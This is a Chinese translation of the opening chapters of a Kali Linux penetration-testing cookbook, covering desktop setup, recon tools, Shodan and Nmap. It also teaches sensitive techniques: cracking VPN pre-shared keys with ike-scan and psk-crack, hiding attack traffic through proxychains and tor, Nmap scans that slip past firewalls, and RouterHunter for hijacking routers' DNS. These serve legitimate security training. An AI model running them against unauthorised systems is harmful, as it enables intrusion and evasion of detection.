# Kali Linux：道德黑客秘籍（一）

> 原文：[`annas-archive.org/md5/7F6D5A44FB1E50E1F70AA8207514D628`](https://annas-archive.org/md5/7F6D5A44FB1E50E1F70AA8207514D628)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 前言

Kali Linux 是人们想到渗透测试时首选的发行版。每年 Kali 都会更新和改进，增加新工具，使其更加强大。我们每天都会看到新的漏洞被发布，随着技术的快速发展，攻击向量也在迅速演变。本书旨在涵盖用户在进行渗透测试时可能遇到的一些独特场景的方法。

本书专门讨论了使用 Kali Linux 从信息收集到报告的渗透测试活动。本书还涵盖了测试无线网络、Web 应用程序以及在 Windows 和 Linux 机器上提升权限以及利用软件程序漏洞的方法。

# 本书涵盖的内容

第一章，*Kali – An Introduction*，介绍了使用不同桌面环境安装 Kali，并通过安装一些自定义工具进行微调。

第二章，*Gathering Intel and Planning Attack Strategies*，介绍了使用多种工具（如 Shodan 等）收集关于目标的子域和其他信息的方法。

第三章，*Vulnerability Assessment*，讨论了在信息收集过程中发现的数据上寻找漏洞的方法。

第四章，*Web App Exploitation – Beyond OWASP Top 10*，讨论了一些独特漏洞的利用，比如序列化和服务器配置错误等。

第五章，*Network Exploitation on Current Exploitation*，侧重于不同工具，可用于利用网络中运行的不同服务（如 Redis、MongoDB 等）的漏洞。

第六章，*Wireless Attacks – Getting Past Aircrack-ng*，教授了一些破解无线网络的新工具，以及使用 aircrack-ng 的方法。

第七章，*Password Attacks – The Fault in Their Stars*，讨论了识别和破解不同类型哈希的方法。

第八章，*Have Shell, Now What?*，介绍了在 Linux 和基于 Windows 的机器上提升权限的不同方法，然后利用该机器作为网关进入网络的方法。

第九章，*Buffer Overflows*，讨论了利用不同的溢出漏洞，如 SEH、基于栈的溢出、egg hunting 等。

第十章，*Playing with Software-Defined Radios*，侧重于探索频率世界，并使用不同工具监视/查看不同频段传输的数据。

第十一章，*Kali in Your Pocket – NetHunters and Raspberries*，讨论了如何在便携设备上安装 Kali Linux，如树莓派或手机，并使用它进行渗透测试。

第十二章，*Writing Reports*，介绍了在渗透测试活动完成后撰写高质量报告的基础知识。

# 本书所需内容

所需的操作系统是 Kali Linux，建议至少 2GB 的 RAM 和 20-40GB 的硬盘空间。

设备所需的硬件包括 RTLSDR 设备（第十章，*Playing with Software-Defined Radios*）和以下链接中提到的设备（第十一章，*Kali in Your Pocket – NetHunters and Raspberries*）：

[`www.offensive-security.com/kali-linux-nethunter-download/`](https://www.offensive-security.com/kali-linux-nethunter-download/)

我们还需要第六章的 Alfa 卡，*无线攻击-绕过 Aircrack-ng*。

# 这本书是为谁准备的

本书面向具有 Kali Linux 基础知识并希望进行高级渗透测试技术的 IT 安全专业人员、渗透测试人员和安全分析师。

# 部分

在本书中，您会经常看到几个标题（*准备就绪*，*如何做*，*它是如何工作的*，*还有更多*，和*另请参阅*）。为了清晰地说明如何完成配方，我们使用这些部分如下：

# 准备就绪

本节告诉您可以在配方中期望什么，并描述了为配方设置任何软件或所需的任何初步设置的方法。

# 如何做…

本节包含了遵循该配方所需的步骤。

# 它是如何工作的…

本节通常包括对前一节中发生的事情的详细解释。

# 还有更多…

本节包含有关该配方的其他信息，以使读者对该配方有更多了解。

# 另请参阅

本节提供了有关配方的其他有用信息的链接。

# 约定

在本书中，您会发现许多文本样式，用于区分不同类型的信息。以下是这些样式的一些示例及其含义的解释。文本中的代码词、数据库表名、文件夹名、文件名、文件扩展名、路径名、虚拟 URL、用户输入和 Twitter 句柄显示如下：“要启动 fierce，我们键入`fierce -h`以查看帮助菜单。”

代码块设置如下：

```
if (argc < 2) 
    { 
        printf("strcpy() NOT executed....\n"); 
        printf("Syntax: %s <characters>\n", argv[0]); 
        exit(0); 
    } 
```

任何命令行输入或输出都以以下方式编写：

```
 fierce -dns host.com -threads 10
```

**新术语**和**重要单词**以粗体显示。例如，屏幕上看到的单词，例如菜单或对话框中的单词，会以这种方式出现在文本中：“我们右键单击并导航到搜索|所有模块中的所有命令。”

警告或重要说明会出现在这样。

提示和技巧会出现在这样。


# 第一章：Kali - 介绍

在本章中，我们将涵盖以下内容：

+   配置 Kali Linux

+   配置 Xfce 环境

+   配置 Mate 环境

+   配置 LXDE 环境

+   配置 e17 环境

+   配置 KDE 环境

+   使用自定义工具进行准备

+   渗透测试 VPN 的 ike-scan

+   设置 proxychains

+   使用 Routerhunter 进行狩猎

# 介绍

Kali 于 2012 年首次推出，采用全新的架构。这个基于 Debian 的发行版发布时带有 300 多个专门用于渗透测试和数字取证的工具。它由 Offensive Security Ltd 维护和资助，核心开发人员是 Mati Aharoni、Devon Kearns 和 Raphael Hertzog。

Kali 2.0 于 2016 年推出，带来了大量新的更新和新的桌面环境，如 KDE、Mate、LXDE、e17 和 Xfce 版本。

虽然 Kali 已经预装了数百种令人惊叹的工具和实用程序，以帮助全球的渗透测试人员高效地完成工作，但在本章中，我们主要将介绍一些自定义调整，以便用户可以更好地进行渗透测试体验。

# 配置 Kali Linux

我们将使用 Offensive Security 提供的官方 Kali Linux ISO 来安装和配置不同的桌面环境，如 Mate、e17、Xfce、LXDE 和 KDE 桌面。

# 准备就绪

要开始这个教程，我们将使用 Offensive Security 网站上列出的 64 位 Kali Linux ISO：

[`www.kali.org/downloads/`](https://www.kali.org/downloads/)

对于希望在虚拟机中配置 Kali 的用户，如 VMware、VirtualBox 等，可以从[`www.offensive-security.com/kali-linux-vmware-virtualbox-image-download/`](https://www.offensive-security.com/kali-linux-vmware-virtualbox-image-download/)下载 Linux 的预构建镜像。

在本章中，我们将使用虚拟镜像，并使用一些额外的工具进行定制。

# 如何操作...

您可以按照给定的步骤配置 Kali：

1.  双击 VirtualBox 镜像，它应该会在 VirtualBox 中打开：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/14636e3a-7c11-4ba2-85e7-cce85a5607cd.png)

1.  点击导入：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/32d80238-d983-4d43-8440-510093fd43e2.png)

1.  启动机器并输入密码`toor`：

1.  现在，Kali 已启动，默认配置为 GNOME 桌面环境：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/0b5f1c8f-bf4e-44b4-974d-2282aedf602d.png)

# 它是如何工作的...

使用预构建的镜像，您无需担心安装过程。您可以将其视为即插即用的解决方案。只需点击运行，虚拟机将启动 Linux，就像普通机器一样。

# 配置 Xfce 环境

Xfce 是 Unix 和类 Unix 平台的免费、快速和轻量级桌面环境。它由 Olivier Fourdan 于 1996 年开始。**Xfce**最初代表**XForms Common Environment**，但自那时起，Xfce 已经重写两次，不再使用 XForms 工具包。

# 如何操作...

要配置 Xfce 环境，请按照以下步骤进行操作：

1.  我们首先使用以下命令安装 Xfce 以及所有插件和好东西：

```
 apt-get install kali-defaults kali-root desktop-base xfce4
        xfce4-places-plugin xfce4-goodies
```

以下截图显示了前面的命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/05b0e78d-ada6-4888-84c3-2a14a50b42d0.png)

1.  在要求确认额外空间需求时键入`Y`。

1.  在出现的对话框上选择确定。

1.  我们选择 lightdm 作为默认的桌面管理器，并按下*Enter*键。

1.  安装完成后，我们打开一个终端窗口并输入以下命令：

```
 update-alternatives --config x-session-manager 
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/d8587cd6-080c-486b-98c1-5138a62f359b.png)

1.  选择选项`xfce4-session`（在我们的案例中是`3`）并按下*Enter*键。

1.  注销并重新登录，或者您可以重新启动机器，我们将看到 Xfce 环境：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/57d85b07-5447-4d19-8cc4-38865bd9d93c.png)

# 配置 Mate 环境

Mate 桌面环境是在 GNOME 2 的基础上构建的。它于 2011 年首次发布。

# 如何操作...

要配置 Mate 环境，请按照以下步骤进行：

1.  我们首先使用以下命令来安装 Mate 环境：

```
 apt-get install desktop-base mate-desktop-environment 
```

以下截图显示了上述命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/16749e66-2dec-4a85-950b-2fcff8e81135.png)

1.  当它要求确认额外的空间需求时，输入`Y`。

1.  安装完成后，我们将使用以下命令将 Mate 设置为我们的默认环境：

```
 update-alternatives --config x-session-manager
```

1.  选择选项`mate-session`（在我们的情况下是`2`）并按下*Enter*键：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/6a182b72-f54c-44f8-8609-b3048359f37c.png)

1.  注销并重新登录或重新启动，我们将看到 Mate 环境：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/a5fcadd1-0d74-4882-bcba-1fe8a5ebe31a.png)

# 配置 LXDE 环境

LXDE 是用 C 编写的自由开源环境，使用 GTK+工具包用于 Unix 和其他 POSIX 平台。**轻量级 X11 桌面环境**（**LXDE**）是许多操作系统的默认环境，如 Knoppix、Raspbian、Lubuntu 等。

# 如何做...

要配置 LXDE 环境，请按照以下步骤进行：

1.  我们首先使用以下命令来安装 LXDE：

```
 apt-get install lxde-core lxde
```

1.  当它要求确认额外的空间需求时，输入`Y`。

1.  安装完成后，我们打开一个终端窗口并输入以下命令：

```
 update-alternatives --config x-session-manager
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/f3ba43f5-38dc-4d15-aa9d-af17997cfd15.png)

1.  选择选项`lxsession`（在我们的情况下是`4`）并按*Enter*。

1.  注销并重新登录，我们将看到 LXDE 环境：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/8d774766-f648-452a-96e0-1aa9bf24b62a.png)

# 配置 e17 环境

**Enlightenment**，或者称为**E**，是 X Windows 系统的窗口管理器。它于 1997 年首次发布。它有很多功能，比如 engage、虚拟桌面、平铺等等。

# 如何做...

由于兼容性问题和依赖关系的麻烦，最好将 Kali 环境设置为不同的机器。这个 ISO 镜像（Kali 64 位 e17）已经在 Kali Linux 官方网站上提供，并可以从以下 URL 下载：

[`www.kali.org/downloads/`](https://www.kali.org/downloads/)。

# 配置 KDE 环境

KDE 是一个自由软件的国际社区。Plasma 桌面是 KDE 最受欢迎的项目之一；它是许多 Linux 发行版的默认桌面环境。它由 Matthias Ettrich 于 1996 年创立。

# 如何做...

要配置 KDE 环境，请按照以下步骤进行：

1.  我们使用以下命令来安装 KDE：

```
 apt-get install kali-defaults kali-root-login desktop-base
        kde-plasma-desktop 
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/9fc06226-04ca-4874-8c82-8bdd0fd772cd.png)

1.  当它要求确认额外的空间需求时，输入`Y`。

1.  在弹出的两个窗口上点击 OK。

1.  安装完成后，我们打开一个终端窗口并输入以下命令：

```
 update-alternatives --config x-session-manager 
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/0fdad0c5-e1a7-4d28-ae25-742cf4ea123d.png)

1.  选择 KDE 会话选项（在我们的情况下是`2`）并按*Enter*。

1.  注销并重新登录，我们将看到 KDE 环境：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/0122b438-6bb9-415d-9e64-75b490b5759e.png)

Kali 已经提供了不同桌面环境的预构建镜像。这些可以从这里下载：[`www.kali.org/downloads/`](https://www.kali.org/downloads/)。

# 准备使用自定义工具

你将安装的这些工具都是在 GitHub 上开源的。它们更快，包含了人们在自己的渗透测试经验中在一段时间内包含的不同调整的集合。

# 准备工作

这是一些工具的列表，在我们深入渗透测试之前你需要的。不用担心，你将在接下来的几章中学习它们的用法，并且会有一些真实的例子。然而，如果你仍然希望在早期阶段学习基础知识，可以简单地用简单的命令完成：

+   `toolname -help`

+   `toolname -h`

# 如何做...

一些工具列在以下部分。

# Dnscan

Dnscan 是一个使用单词列表解析有效子域的 Python 工具。要了解有关 Dnscan 的信息，请按照给定的步骤进行：

1.  我们将使用一个简单的命令来克隆 git 存储库：

```
 git clone https://github.com/rbsec/dnscan.git
```

以下屏幕截图显示了上述命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/1b3a9999-7211-40f8-89c8-6e339f360298.png)

1.  您还可以从[`github.com/rbsec/dnscan`](https://github.com/rbsec/dnscan)下载并保存它。

1.  接下来我们进入下载 Dnscan 的目录。

1.  使用以下命令运行 Dnscan：

```
 ./dnscan.py -h
```

以下屏幕截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/a55ea837-56bf-401f-983b-bb65f75ad479.png)

# Subbrute

接下来我们将安装 subbrute。它非常快速，并提供了额外的匿名层，因为它使用公共解析器来暴力破解子域：

1.  这里的命令再次很简单：

```
 git clone https://github.com/TheRook/subbrute.git
```

以下屏幕截图显示了上述命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/9c9e4e3b-1ffa-436d-a8a3-e9cc7a7db617.png)

1.  或者您可以从[`github.com/TheRook/subbrute`](https://github.com/TheRook/subbrute)下载并保存它。

1.  安装完成后，我们将需要一个单词列表来运行它，我们可以下载 dnspop 的列表。这个列表也可以在之前的配方中使用：[`github.com/bitquark/dnspop/tree/master/results`](https://github.com/bitquark/dnspop/tree/master/results)。

1.  一旦两者都设置好，我们就进入 subbrute 的目录，并使用以下命令运行它：

```
 ./subbrute.py
```

1.  要针对我们的单词列表扫描域名，使用以下命令：

```
 ./subbrute.py -s /path/to/wordlist hostname.com
```

# Dirsearch

我们下一个工具是 dirsearch。顾名思义，它是一个简单的命令行工具，可用于暴力破解目录。它比传统的 DIRB 要快得多：

1.  安装的命令是：

```
 git clone https://github.com/maurosoria/dirsearch.git
```

1.  或者您可以从[`github.com/maurosoria/dirsearch`](https://github.com/maurosoria/dirsearch)下载并保存它。以下屏幕截图显示了上述命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/e415539c-b9d0-43e7-b172-9676c205fc82.png)

1.  一旦克隆完成，就浏览到目录并使用以下命令运行工具：

```
 ./dirsearch.py -u hostname.com -e aspx,php
```

以下屏幕截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/ae82f928-fe8c-477c-829e-169d01a8527b.png)

# 渗透测试 VPN 的 ike-scan

在渗透测试期间，我们可能会遇到 VPN 端点。但是，发现这些端点的漏洞并利用它们并不是一种众所周知的方法。VPN 端点使用**Internet Key Exchange**（**IKE**）协议在多个客户端之间建立*安全关联*以建立 VPN 隧道。

IKE 有两个阶段，*第 1 阶段*负责建立和建立安全认证通道，*第 2 阶段*加密和传输数据。

我们的兴趣重点将是*第 1 阶段*；它使用两种交换密钥的方法：

+   主模式

+   激进模式

我们将寻找使用 PSK 身份验证的激进模式启用的 VPN 端点。

# 准备工作

对于这个配方，我们将使用工具`ike-scan`和`ikeprobe`。首先，通过克隆 git 存储库来安装`ike-scan`：

```
git clone https://github.com/royhills/ike-scan.git
```

或者您可以使用以下 URL 从[`github.com/royhills/ike-scan`](https://github.com/royhills/ike-scan)下载它。

# 如何做...

要配置`ike-scan`，请按照给定的步骤进行：

1.  浏览到安装了`ike-scan`的目录。

1.  通过运行以下命令安装`autoconf`：

```
 apt-get install autoconf
```

1.  运行`autoreconf --install`来生成`.configure`文件。

1.  运行`./configure`。

1.  运行`make`来构建项目。

1.  运行`make check`来验证构建阶段。

1.  运行`make install`来安装`ike-scan`。

1.  要扫描主机进行激进模式握手，请使用以下命令：

```
 ike-scan x.x.x.x -M -A
```

以下屏幕截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/a3596059-9058-42bb-bad9-3411e3fd966e.png)

1.  有时，我们会在提供有效组名（vpn）后看到响应：

```
 ike-scan x.x.x.x -M -A id=vpn
```

以下屏幕截图显示了上述命令的示例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/1d66efb8-607e-4763-bbd6-adda5b42ea30.png)

我们甚至可以使用以下脚本来暴力破解组名：

[`github.com/SpiderLabs/groupenum`](https://github.com/SpiderLabs/groupenum). [](https://github.com/SpiderLabs/groupenum)

命令：

`./dt_group_enum.sh x.x.x.x groupnames.dic`

# 破解 PSK

要了解如何破解 PSK，请按照给定的步骤进行：

1.  在`ike-scan`命令中添加`-P`标志，它将显示捕获的哈希的响应。

1.  要保存哈希，我们提供一个带有`-P`标志的文件名。

1.  接下来，我们可以使用以下命令使用`psk-crack`：

```
 psk-crack -b 5 /path/to/pskkey
```

1.  其中`-b`是暴力破解模式，长度为`5`。

1.  要使用基于字典的攻击，我们使用以下命令：

```
 psk-crack -d /path/to/dictionary /path/to/pskkey 
```

以下屏幕截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/7677b531-0a79-44e3-bfe9-4b95f628fef4.png)

# 它是如何工作的...

在侵略模式下，认证哈希作为对试图建立连接隧道（IPSEC）的 VPN 客户端的数据包的响应进行传输。该哈希未加密，因此允许我们捕获哈希并对其进行暴力攻击以恢复我们的 PSK。

这在主模式下是不可能的，因为它使用加密哈希以及六路握手，而侵略模式只使用三路握手。

# 设置 proxychains

有时，在执行渗透测试活动时，我们需要保持匿名。Proxychains 通过允许我们使用中间系统来帮助我们，其 IP 可以留在系统日志中，而不必担心追溯到我们。

Proxychains 是一种工具，允许任何应用程序通过代理（如 SOCKS5、Tor 等）进行连接。

# 如何做到...

Kali 中已经安装了 Proxychains。但是，我们需要将代理列表添加到其配置文件中，以便使用：

1.  为此，我们使用以下命令在文本编辑器中打开 proxychains 的配置文件：

```
 leafpad /etc/proxychains.conf
```

以下屏幕截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/93df95bd-f178-48b6-9af7-f82de2c1373b.png)

我们可以在上述突出显示的区域中添加所有我们想要的代理，然后保存。

Proxychains 还允许我们在连接到代理服务器时使用动态链或随机链。

1.  在配置文件中取消注释**dynamic_chain**或**random_chain**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/2ff520ed-baf3-4f8c-8f47-d39209f96322.png)

# 使用 tor 的 proxychains

要了解`tor`，请按照给定的步骤进行：

1.  要使用 proxychains 与 tor，我们首先需要使用以下命令安装 tor：

```
 apt-get install tor
```

1.  安装完成后，我们通过在终端中输入`tor`来运行 tor。

1.  然后我们打开另一个终端，并输入以下命令以通过 proxychains 使用应用程序：

```
 proxychains toolname -arguments
```

以下屏幕截图显示了上述命令的示例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/7fdf7841-d065-43bf-a44f-d22132efe27e.png)

# 使用 Routerhunter 进行狩猎

Routerhunter 是一种工具，用于在网络上查找易受攻击的路由器并对其进行各种攻击，以利用 DNSChanger 漏洞。该漏洞允许攻击者更改路由器的 DNS 服务器，从而将所有流量定向到所需的网站。

# 准备工作

对于这个教程，您需要再次克隆一个 git 存储库。

我们将使用以下命令：

```
git clone https://github.com/jh00nbr/RouterHunterBR.git
```

# 如何做到...

执行`RouterHunterBR.php`，按照给定的步骤进行：

1.  文件克隆后，进入目录。

1.  运行以下命令：

```
 php RouterHunterBR.php -h
```

以下屏幕截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/ddeff2ac-eeac-4280-87a8-339e2ee913f7.png)

1.  我们可以为 Routerhunter 提供 IP 范围、DNS 服务器 IP 等。


# 第二章：收集情报和规划攻击策略

在本章中，我们将介绍以下配方：

+   获取子域列表

+   使用 Shodan 进行娱乐和盈利

+   Shodan Honeyscore

+   Shodan 插件

+   使用 Nmap 查找开放端口

+   使用 Nmap 绕过防火墙

+   搜索开放目录

+   使用 DMitry 进行深度探测

+   寻找 SSL 漏洞

+   使用 intrace 探索连接

+   深入挖掘使用 theharvester

+   查找 Web 应用程序背后的技术

+   使用 masscan 扫描 IP

+   使用 Kismet 进行嗅探

+   使用 firewalk 测试路由器

# 介绍

在上一章中，我们学习了狩猎子域的基础知识。在本章中，我们将深入一点，看看其他可用于收集目标情报的不同工具。我们首先使用 Kali Linux 中臭名昭著的工具。

收集信息是进行渗透测试的一个非常关键的阶段，因为在此阶段收集的所有信息将完全决定我们在接下来的每一步。因此，在进入利用阶段之前，我们尽可能多地收集信息非常重要。

# 获取子域列表

我们并不总是处于客户已经定义了需要进行渗透测试的详细范围的情况。因此，我们将使用以下提到的配方尽可能多地收集信息，以进行渗透测试。

# Fierce

我们首先跳转到 Kali 的终端，使用第一个和最常用的工具`fierce`。

# 如何做...

以下步骤演示了如何使用`fierce`：

1.  要启动 fierce，我们输入`fierce -h`来查看帮助菜单：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/85300354-60d2-4ea1-8258-6d2082bf627c.png)

1.  执行子域扫描我们使用以下命令：

```
 fierce -dns host.com -threads 10
```

以下截图显示了前述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/0a76a4d2-5034-4360-abfe-506bb041d434.png)

# DNSdumpster

这是 Hacker Target 的一个免费项目，用于查找子域。它依赖于[`scans.io/`](https://scans.io/)来获取结果。它也可以用于获取网站的子域。我们应该始终倾向于使用多个工具进行子域枚举，因为我们可能会从其他工具中得到第一个工具未能捕获的信息。

# 如何做...

使用起来非常简单。我们输入要获取子域的域名，它会显示结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/b0462e37-cb98-46a9-a70f-e06481f49932.png)

# 使用 Shodan 进行娱乐和盈利

Shodan 是世界上第一个搜索连接到互联网的设备的搜索引擎。它由 John Matherly 于 2009 年推出。Shodan 可用于查找网络摄像头、数据库、工业系统、视频游戏等。Shodan 主要收集运行的最流行的网络服务的数据，如 HTTP、HTTPS、MongoDB、FTP 等等。

# 做好准备

要使用 Shodan，我们需要在 Shodan 上创建一个帐户。

# 如何做...

要了解 Shodan，请按照给定的步骤进行：

1.  打开浏览器，访问[`www.shodan.io`](https://www.shodan.io)：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/c37be7d1-dcc2-4486-9a00-c02619411c09.png)

1.  我们首先执行一个简单的搜索，查找正在运行的 FTP 服务。为此，我们可以使用以下 Shodan dorks：`port:"21"`。以下截图显示了搜索结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/4f081bfa-6d92-4c2e-871e-9efdfc746d11.png)

1.  可以通过指定特定的国家/组织来使此搜索更加具体：`port:"21" country:"IN"`。以下截图显示了搜索结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/c6ddb2e6-ec35-4d64-a5d8-00290198facf.png)

1.  现在我们可以看到所有在印度运行的 FTP 服务器；我们还可以看到允许匿名登录的服务器以及它们正在运行的 FTP 服务器的版本。

1.  接下来，我们尝试组织过滤器。可以通过输入`port:"21" country:"IN" org:"BSNL"`来完成，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/881d975d-6c73-41ef-95f3-1c52947ed82b.png)

Shodan 还有其他标签，可以用来进行高级搜索，比如：

+   `net`：扫描 IP 范围

+   `city`：按城市过滤

更多详细信息可以在[`www.shodan.io/explore`](https://www.shodan.io/explore)找到。

# Shodan Honeyscore

Shodan Honeyscore 是另一个出色的 Python 项目。它帮助我们确定我们拥有的 IP 地址是蜜罐还是真实系统。

# 如何做...

以下步骤演示了如何使用 Shodan Honeyscore：

1.  要使用 Shodan Honeyscore，我们访问[`honeyscore.shodan.io/`](https://honeyscore.shodan.io/)：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/f054bc50-87df-4843-a3c1-47f533282dec.png)

1.  输入我们要检查的 IP 地址，就这样！

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/24c6629e-7f52-48ac-bf38-c52c7f164ab5.png)

# Shodan 插件

为了使我们的生活更加轻松，Shodan 还为 Chrome 和 Firefox 提供了插件，可以用来在我们访问的网站上检查开放端口！

# 如何做...

我们可以从[`www.shodan.io/`](https://www.shodan.io/)下载并安装插件。浏览任何网站，我们会发现通过点击插件，我们可以看到开放的端口：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/ff4ac8fa-50e4-491a-8832-10ece78296e1.png)

# 另请参阅

+   来自第一章的*Dnscan*步骤，*Kali – An Introduction*

+   使用 theharvester 深入挖掘的步骤

# 使用 Nmap 查找开放端口

网络映射器（Nmap）是由 Gordon Lyon 编写的安全扫描程序。它用于在网络中查找主机和服务。它最早是在 1997 年 9 月发布的。Nmap 具有各种功能以及用于执行各种测试的脚本，例如查找操作系统、服务版本、暴力破解默认登录等。

一些最常见的扫描类型是：

+   TCP `connect()`扫描

+   SYN 隐秘扫描

+   UDP 扫描

+   Ping 扫描

+   空闲扫描

# 如何做...

以下是使用 Nmap 的步骤：

1.  Nmap 已经安装在 Kali Linux 中。我们可以输入以下命令来启动它并查看所有可用的选项：

```
 nmap -h
```

以下屏幕截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/045da05e-ce64-4018-b197-2c5c551809e6.png)

1.  要执行基本扫描，我们使用以下命令：

```
 nmap -sV -Pn x.x.x.x
```

以下屏幕截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/3273298a-1a37-4b34-ac5f-a459ff060532.png)

1.  `-Pn`表示我们不通过首先执行 ping 请求来检查主机是否正常。`-sV`参数是列出在找到的开放端口上运行的所有服务。

1.  我们可以使用的另一个标志是`-A`，它会自动执行操作系统检测、版本检测、脚本扫描和跟踪路由。命令是：

```
 nmap -A -Pn x.x.x.x
```

1.  要扫描 IP 范围或多个 IP，我们可以使用以下命令：

```
 nmap -A -Pn x.x.x.0/24
```

# 使用脚本

Nmap 脚本引擎（NSE）允许用户创建自己的脚本，以便在运行扫描时并行执行这些脚本来执行不同的任务。它们可用于执行更有效的版本检测、利用漏洞等。使用脚本的命令是：

```
nmap -Pn -sV host.com --script dns-brute
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/f1f9be51-5d1e-4f38-8e4f-8c3503ef4d39.png)

前面命令的输出如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/d1bb1b36-57bb-44bc-8829-a20af81df217.png)

这里的脚本`dns-brute`尝试通过针对一组常见子域名名称进行暴力破解来获取可用的子域名。

# 另请参阅

+   使用 Shodan 进行娱乐和盈利的步骤

+   有关脚本的更多信息可以在官方 NSE 文档中找到[`nmap.org/nsedoc/`](https://nmap.org/nsedoc/)

# 使用 Nmap 绕过防火墙

在渗透测试期间，我们通常会遇到受防火墙或入侵检测系统（IDS）保护的系统。Nmap 提供了不同的方法来绕过这些 IDS/防火墙，执行对网络的端口扫描。在这个步骤中，我们将学习一些绕过防火墙的方法。

# TCP ACK 扫描

ACK 扫描（`-sA`）发送确认包而不是 SYN 包，防火墙不会创建 ACK 包的日志，因为它会将 ACK 包视为对 SYN 包的响应。它主要用于映射防火墙的类型。

# 如何做...

ACK 扫描是为了显示未经过滤和经过滤的端口，而不是打开的端口。

ACK 扫描的命令是：

```
nmap -sA x.x.x.x
```

让我们看看正常扫描与 ACK 扫描的比较：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/e3889456-d344-4c12-afb2-b07c936f04ac.png)

在这里，我们看到正常扫描和 ACK 扫描之间的区别：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/956854a7-c95f-441e-a13d-dc6797d923e4.png)

# 它是如何工作的...

过滤和未过滤端口的扫描结果取决于使用的防火墙是有状态的还是无状态的。有状态防火墙检查传入的 ACK 数据包是否是现有连接的一部分。如果数据包不是任何请求连接的一部分，它将被阻止。因此，在扫描期间，端口将显示为已过滤。

而在无状态防火墙的情况下，它不会阻止 ACK 数据包，端口将显示为未过滤。

# TCP 窗口扫描

窗口扫描（`-sW`）几乎与 ACK 扫描相同，只是显示打开和关闭的端口。

# 如何做到...

让我们看看正常扫描和 TCP 扫描之间的区别：

1.  运行的命令是：

```
 nmap -sW x.x.x.x
```

1.  让我们看看正常扫描与 TCP 窗口扫描的比较：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/982d2593-087e-4c94-bffb-f45d19e06880.png)

1.  我们可以在以下屏幕截图中看到两种扫描之间的区别：

